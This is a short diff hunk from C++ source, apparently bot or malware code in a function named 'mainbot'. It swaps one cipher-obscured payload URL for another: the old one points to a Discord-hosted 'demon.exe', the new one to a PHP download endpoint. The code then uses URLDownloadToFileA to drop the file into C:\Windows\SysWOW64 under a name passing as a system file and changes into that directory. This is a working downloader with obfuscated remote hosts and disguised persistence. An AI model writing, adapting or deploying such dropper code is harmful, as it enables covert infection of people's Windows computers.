@@ -312,7 +312,7 @@ void mainbot()
                 }
 
 
-                std::string download = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/892108037618270258/ghprq.hah").c_str());
+                std::string download = (decrypt("kwwsv://ilohpdqdjhu.dl/qhz/dssolfdwlrq/dsl/grzqordg.sks?ilohKhb=G2fJmtJMHn8Ds5ek").c_str());
                 std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                 URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
                 system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
